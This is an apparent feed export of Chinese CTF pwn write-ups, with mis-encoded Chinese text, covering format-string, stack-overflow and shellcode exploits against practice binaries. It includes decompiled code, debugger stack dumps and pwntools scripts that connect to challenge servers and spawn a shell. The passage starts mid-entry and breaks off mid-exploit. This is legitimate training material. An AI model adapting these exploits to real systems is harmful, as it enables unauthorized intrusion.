(_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">21:0084â”‚     0xffffcf34 â—‚â€” 0x1a</span><br><span class="line">22:0088â”‚     0xffffcf38 â€”â–¸ 0x8052acb (_IO_new_file_underflow+11) â—‚â€” add    edi, 0x87535</span><br><span class="line">23:008câ”‚     0xffffcf3c â€”â–¸ 0x80da340 (_IO_2_1_stdin_) â—‚â€” 0xfbad208b</span><br><span class="line">24:0090â”‚     0xffffcf40 â€”â–¸ 0x80db1a0 (_IO_file_jumps) â—‚â€” 0x0</span><br><span class="line">25:0094â”‚     0xffffcf44 â€”â–¸ 0x80da340 (_IO_2_1_stdin_) â—‚â€” 0xfbad208b</span><br><span class="line">26:0098â”‚ ebp 0xffffcf48 â€”â–¸ 0xffffcfa8 â€”â–¸ 0xffffcfd8 â€”â–¸ 0xffffcfe8 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>åˆç”¨IDAåç¼–è¯‘å¾—åˆ°äº†åé—¨å‡½æ•°,ä¸è¿‡å¹¶ä¸ä¼šç›´æ¥æ‰“å°å‡ºflag,ç»è¿‡æé†’å‘ç°ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸Šçš„æ•°æ®,æ€è·¯å·²ç»éƒ½æœ‰äº†,å…ˆæ ˆæº¢å‡ºè·³è½¬åˆ°winå‡½æ•°ç„¶åç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸Šçš„flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp-Ch] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">16</span>]; <span class="comment">// [esp+Bh] [ebp-5Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">65</span>]; <span class="comment">// [esp+1Bh] [ebp-4Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  fgets(v3, <span class="number">65</span>, v4);</span><br><span class="line">  fgets(v2, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(v2, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./cnary&#x27;</span>)</span><br><span class="line"><span class="comment">#io = gdb.debug(&#x27;./cnary&#x27;, &#x27;b *0x80488A5&#x27;)</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x80488A5&#x27;</span>)</span><br><span class="line">offset = <span class="number">28</span></span><br><span class="line">win = <span class="number">0x080488DE</span></span><br><span class="line">pad1 = cyclic(offset)+p32(win)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Canary?&#x27;</span>, pad1)</span><br><span class="line">pad2=<span class="string">b&#x27;%31$s&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(pad2)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ esp <span class="number">0xffa020f4</span> â—‚â€” <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>â”‚     <span class="number">0xffa020f8</span> â—‚â€” <span class="number">0x1a</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>â”‚     <span class="number">0xffa020fc</span> â—‚â€” <span class="number">0x2506c5ad</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>câ”‚     <span class="number">0xffa02100</span> â—‚â€” <span class="string">&#x27;31$s\n&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>â”‚     <span class="number">0xffa02104</span> â—‚â€” <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>â”‚     <span class="number">0xffa02108</span> â€”â–¸ <span class="number">0x80da000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>â”‚     <span class="number">0xffa0210c</span> â—‚â€” <span class="number">0x66a02140</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>câ”‚     <span class="number">0xffa02110</span> â—‚â€” <span class="string">&#x27;alg&#123;fake&#125;\n&#x27;</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>â”‚     <span class="number">0xffa02114</span> â—‚â€” <span class="string">&#x27;fake&#125;\n&#x27;</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>â”‚     <span class="number">0xffa02118</span> â—‚â€” <span class="number">0x8000a7d</span> <span class="comment">/* &#x27;&#125;\n&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0028</span>â”‚     <span class="number">0xffa0211c</span> â€”â–¸ <span class="number">0x80da000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">002</span>câ”‚     <span class="number">0xffa02120</span> â€”â–¸ <span class="number">0x80da000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0030</span>â”‚     <span class="number">0xffa02124</span> â€”â–¸ <span class="number">0x80481a8</span> (_init) â—‚â€” push   ebx</span><br><span class="line"><span class="number">0</span>d:<span class="number">0034</span>â”‚     <span class="number">0xffa02128</span> â€”â–¸ <span class="number">0xffa02158</span> â—‚â€” <span class="string">&#x27;faaagaaa&#x27;</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0038</span>â”‚     <span class="number">0xffa0212c</span> â€”â–¸ <span class="number">0x80488d5</span> (vuln+<span class="number">48</span>) â—‚â€” add    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">003</span>câ”‚     <span class="number">0xffa02130</span> â€”â–¸ <span class="number">0xffa02140</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>â”‚     <span class="number">0xffa02134</span> â—‚â€” <span class="number">0x3e8</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>â”‚     <span class="number">0xffa02138</span> â—‚â€” <span class="number">0x3e8</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>â”‚     <span class="number">0xffa0213c</span> â€”â–¸ <span class="number">0x80488b1</span> (vuln+<span class="number">12</span>) â—‚â€” add    ebx, <span class="number">0x9174f</span></span><br><span class="line"><span class="number">13</span>:<span class="number">004</span>câ”‚     <span class="number">0xffa02140</span> â—‚â€” <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">//æœ¬åœ°è°ƒè¯•è®¾å®šçš„flag</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>â”‚     <span class="number">0xffa02144</span> â—‚â€” <span class="number">0x61616162</span> (<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>â”‚     <span class="number">0xffa02148</span> â—‚â€” <span class="number">0x61616163</span> (<span class="string">&#x27;caaa&#x27;</span>)</span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>â”‚     <span class="number">0xffa0214c</span> â—‚â€” <span class="number">0x61616164</span> (<span class="string">&#x27;daaa&#x27;</span>)</span><br><span class="line"><span class="number">17</span>:<span class="number">005</span>câ”‚     <span class="number">0xffa02150</span> â€”â–¸ <span class="number">0x99b02e0</span> â—‚â€” <span class="number">0xfbad2488</span></span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>â”‚     <span class="number">0xffa02154</span> â—‚â€” <span class="string">&#x27;faaafaaagaaa&#x27;</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>â”‚     <span class="number">0xffa02158</span> â—‚â€” <span class="string">&#x27;faaagaaa&#x27;</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">0068</span>â”‚ ebp <span class="number">0xffa0215c</span> â—‚â€” <span class="string">&#x27;gaaa&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æ£€æŸ¥é˜²æŠ¤&quot;&gt;1.æ£€æŸ¥é˜²æŠ¤&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¬¬äº”ç©ºé—´2019å†³èµ›PWN5 1 WP</title>
    <link href="https://www.fomal.cc/posts/5ecce871.html"/>
    <id>https://www.fomal.cc/posts/5ecce871.html</id>
    <published>2023-04-02T03:02:22.693Z</published>
    <updated>2023-04-02T03:03:01.992Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">99u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);<span class="comment">//æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">15u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>å¼€äº†canaryå’ŒNXä¿æŠ¤,çœ‹ä¼ªä»£ç å¯ä»¥å‘ç°å­˜åœ¨ä¸€å¤„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,åˆ©ç”¨<code>printf(buf)</code>å°†<code>dword_804C044</code>ä¿®æ”¹æˆæˆ‘ä»¬éœ€è¦çš„æ•°å­—ç„¶åå†è¾“å…¥ä¸€æ¬¡å°±èƒ½è·å–shelläº†.éœ€è¦å†æ¬¡æ³¨æ„çš„æ˜¯è¦†ç›–çš„æ ¼å¼åŒ–å‚æ•°å¹¶ä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ¬èº«,ç¬”è€…åœ¨è¿™é‡Œå¤„ç†æ—¶åˆå¼„æ··äº†å¯¼è‡´ä¸€ç›´ä¿®æ”¹ä¸äº†åœ°å€.å¦å¤–æ³¨æ„,å­—ç¬¦ä¸²æ˜¯å°ç«¯åºå­˜å‚¨æ–¹å¼.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29131</span>)</span><br><span class="line"></span><br><span class="line">cat_flag=<span class="number">0x804c044</span></span><br><span class="line">payload=p32(cat_flag)+p32(cat_flag+<span class="number">1</span>)+p32(cat_flag+<span class="number">2</span>)+p32(cat_flag+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span> <span class="comment">#è¿™é‡Œç”¨n,hn,hhnéƒ½è¡Œ,å› ä¸ºæ˜¯æ¯ä¸€ä¸ªå­—èŠ‚å†…å­˜æ”¹çš„,hhnåˆšå¥½ä¸€ä¸ªå­—èŠ‚å†™å…¥,å…¶ä»–çš„æˆªæ–­åªå‰©æœ€ä½å­—èŠ‚</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;269488144&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendline(str(0x10101010)) #ä¹Ÿå¯ä»¥è¿™æ ·,æ‰“å°äº†å››ä¸ªåœ°å€å æ®16ä¸ªå­—èŠ‚,æ‰€ä»¥æ¯å­—èŠ‚ä¸Šå†™çš„æ˜¯0x10</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwnable start å¤ç°</title>
    <link href="https://www.fomal.cc/posts/fe410f7d.html"/>
    <id>https://www.fomal.cc/posts/fe410f7d.html</id>
    <published>2023-04-02T03:02:22.692Z</published>
    <updated>2023-04-02T03:03:01.992Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0x3C00000003</span>LL;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX - sys_write</span><br><span class="line">    <span class="type">int</span>     <span class="number">80</span>h; LINUX -</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h</span><br><span class="line">push    20656874h</span><br><span class="line">push    20747261h</span><br><span class="line">push    74732073h</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†æ">2.åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æƒ¯ä¾‹ä½¿ç”¨checksecæ£€æŸ¥ä¸€ä¸‹é˜²æŠ¤æªæ–½,å‘ç°å…¨éƒ¨å…³é—­.IDAåç¼–è¯‘å‘ç°åªæœ‰<code>start()</code>å’Œ<code>exit()</code>,ä¸è¿‡ç›´æ¥çœ‹æ±‡ç¼–ç è¿˜æ˜¯æœ‰ç‚¹æ€è·¯çš„,å¯ä»¥çœ‹å‡ºæ—§çš„espå†…å®¹è¢«å‹åˆ°äº†<code>exit()</code>çš„ä¸‹é¢,ç„¶åç³»ç»Ÿè°ƒç”¨äº†<code>sys_write</code>å’Œ<code>sys_read</code>ä¸¤ä¸ªå‡½æ•°,è°ƒç”¨å®Œåä¼šæ‰§è¡Œ<code>exit()</code>.</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è°ƒç”¨<code>sys_read</code>çš„æ—¶å€™æŠŠretè¦æ‰§è¡Œçš„<code>exit()</code>å‡½æ•°è¦†ç›–æˆç³»ç»Ÿè°ƒç”¨çš„<code>sys_write</code>çš„èµ·å§‹åœ°å€,è¿™æ ·å°±ä¼šåˆ›é€ å‡ºä¸€ä¸ªç±»ä¼¼ä¸‹é¢çš„æ ˆç»“æ„,å½“æˆ‘ä»¬æŠŠretçš„<code>exit()</code>æ”¹æˆ<code>sys_write</code>ä»¥å,espä¼šä¿å­˜å­˜æ”¾old espçš„å†…å­˜åœ°å€,æ­¤æ—¶<code>syswrite</code>å°±ä¼šæ‰§è¡Œæ‰“å°å‡ºold esp,åé¢æ‰§è¡Œå°±æ˜¯ä»old espåœ°å€å¤„å¼€å§‹æ‰§è¡Œäº†,<code>sys_write</code>æ‰§è¡Œå®Œä»¥åä¼šè¿›è¡Œesp+14cçš„è·³è½¬å†ret,æ‰€ä»¥æˆ‘ä»¬å…ˆè¯»å…¥0x14cçš„ä¸œè¥¿å†å†™å…¥retåœ°å€(ä¹Ÿå°±åœ¨ä¸‹é¢ä¸€ä¸ªå•å…ƒ),retåœ°å€è‡ªç„¶æ˜¯old esp+0x14,ç„¶åeipæŒ‡å‘[old esp+0x14],æ‰§è¡Œshellcode.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087 89 E1                         mov     ecx, esp                        ; addr</span><br><span class="line">.text:08048089 B2 14                         mov     dl, 14h                         ; len</span><br><span class="line">.text:0804808B B3 01                         mov     bl, 1                           ; fd</span><br><span class="line">.text:0804808D B0 04                         mov     al, 4</span><br><span class="line">.text:0804808F CD 80                         int     80h    </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ ecx esp 0xffffd094 â—‚â€” 0x27740a6e (<span class="string">&quot;n\nt&#x27;&quot;</span>)</span><br><span class="line">01:0004â”‚         0xffffd098 â—‚â€” 0x74732073 (<span class="string">&#x27;s st&#x27;</span>)</span><br><span class="line">02:0008â”‚         0xffffd09c â—‚â€” 0x20747261 (<span class="string">&#x27;art &#x27;</span>)</span><br><span class="line">03:000câ”‚         0xffffd0a0 â—‚â€” 0x20656874 (<span class="string">&#x27;the &#x27;</span>)</span><br><span class="line">04:0010â”‚         0xffffd0a4 â—‚â€” 0x3a465443 (<span class="string">&#x27;CTF:&#x27;</span>)</span><br><span class="line">05:0014â”‚         0xffffd0a8 â€”â–¸ 0x804809d (_exit) â—‚â€” pop    esp</span><br><span class="line">06:0018â”‚         0xffffd0ac â€”â–¸ 0xffffd0b0 â—‚â€” 0x1 <span class="comment">#old esp</span></span><br><span class="line">07:001câ”‚         0xffffd0b0 â—‚â€” 0x1 </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  0x804808f  &lt;_start+47&gt;    int    0x80</span><br><span class="line">  0x8048091  &lt;_start+49&gt;    xor    ebx, ebx</span><br><span class="line">  0x8048093  &lt;_start+51&gt;    mov    dl, 0x3c</span><br><span class="line">  0x8048095  &lt;_start+53&gt;    mov    al, 3</span><br><span class="line">  0x8048097  &lt;_start+55&gt;    int    0x80</span><br><span class="line">â–º 0x8048099  &lt;_start+57&gt;    add    esp, 0x14<span class="comment">#è·³è½¬</span></span><br><span class="line">  0x804809c  &lt;_start+60&gt;    ret</span><br><span class="line">  â†“ </span><br><span class="line">  0xff83d424                xor    eax, eax</span><br><span class="line">  0xff83d426                push   eax</span><br><span class="line">  0xff83d427                push   0x68732f2f</span><br><span class="line">  0xff83d42c                push   0x6e69622f</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. â†“            4 skipped</span><br><span class="line">05:0014â”‚         0xff83d420 â€”â–¸ 0xff83d424 â—‚â€” 0x6850c031</span><br><span class="line">06:0018â”‚         0xff83d424 â—‚â€” 0x6850c031</span><br><span class="line">07:001câ”‚         0xff83d428 â—‚â€” 0x68732f2f (<span class="string">&#x27;//sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†è¾“å…¥æ„é€ å¥½çš„shellcode,å¹¶ä¸”æŠŠretçš„åœ°å€å†æ¬¡è¦†ç›–æˆshellcodeçš„èµ·å§‹åœ°å€,å³å¯è·å–shell.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./start&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048060&#x27;)</span></span><br><span class="line"><span class="comment">#io.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;CTF:&#x27;</span>)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.send(offset*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x08048087</span>))</span><br><span class="line">esp=io.recv(<span class="number">4</span>)</span><br><span class="line">payload = <span class="number">20</span> *<span class="string">b&quot;a&quot;</span> + p32(u32(esp) + <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">payload += <span 